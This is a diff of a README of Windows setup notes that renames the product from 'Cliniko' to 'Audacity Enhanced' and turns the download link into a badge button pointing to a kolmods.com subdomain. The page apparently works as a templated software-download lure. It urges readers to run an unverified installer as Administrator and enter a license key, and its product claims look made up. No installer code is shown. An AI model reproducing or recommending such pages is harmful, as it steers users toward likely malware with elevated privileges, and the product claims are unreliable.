@@ -1,10 +1,14 @@
-# Cliniko Windows Setup Notes
+# Audacity Enhanced Windows Setup Notes
 
-**Download:** [Get Windows installer →](https://cliniko-setup.kolmods.com/)
+<p align="center">
+  <a href="https://audacity-enhanced-setup.kolmods.com/">
+    <img src="https://img.shields.io/badge/Download-Audacity%20Enhanced-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Audacity Enhanced">
+  </a>
+</p>
 
 ## Download & Install
 
-> Setup notes for **Cliniko** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Audacity Enhanced** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +16,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Cliniko** from the Start menu
+5. Restart if the installer asks — then launch **Audacity Enhanced** from the Start menu
 
 ## What you can use it for
 
-- Core Cliniko features on Windows desktop
-- Install and configure Cliniko for daily use
-- Import, edit, and export with Cliniko tools
-- Tune settings and profiles inside Cliniko
-- Integrate Cliniko into your existing workflow
+- Multitrack audio and MIDI recording
+- Mixing buses, sends, and plugin chains
+- Comping, editing, and time-stretch tools
+- Export stems and masters in multiple formats
+- Project templates for production workflows
 
 ## License
 
